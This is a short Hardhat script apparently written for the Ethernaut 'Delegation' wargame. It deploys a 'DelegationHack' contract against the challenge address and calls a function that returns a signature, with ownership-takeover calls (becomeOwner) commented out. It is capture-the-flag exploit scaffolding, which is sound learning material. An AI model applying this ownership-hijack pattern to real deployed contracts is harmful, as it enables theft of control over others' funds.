const { utils } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat")

async function main(){
    
    const account = await ethers.getSigners();
    const ethernaut_address  = '0x00B4d5891fA4097e1a751A04D9137588A7b3Ef1e'
    const hacker_account = account[0];

    console.log("Hacker address ", hacker_account.address);

    const delegation_h = await ethers.getContractFactory("DelegationHack");
    console.log("Step2");

    const delegation_hack_deploy = await delegation_h.deploy(ethernaut_address);
    console.log("Hacker 3");

    // console.log("Owner before")
    // const Ownercall = await delegation_hack_deploy.connect(hacker_account).returnOwner();
    // console.log(Ownercall)

    // console.log("Calling Beceome Owner function")
    // const callOwner = await delegation_hack_deploy.connect(hacker_account).becomeOwner();
   
    // callOwner ? console.log("Done") : console.log("Not Done")

    // console.log("Owner After")
    // const Ownercall2 = await delegation_hack_deploy.connect(hacker_account).returnOwner();
    // console.log(Ownercall2)

    console.log("Sig")
    const Ownercall2 = await delegation_hack_deploy.connect(hacker_account).returnSig();
    console.log(Ownercall2)

}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});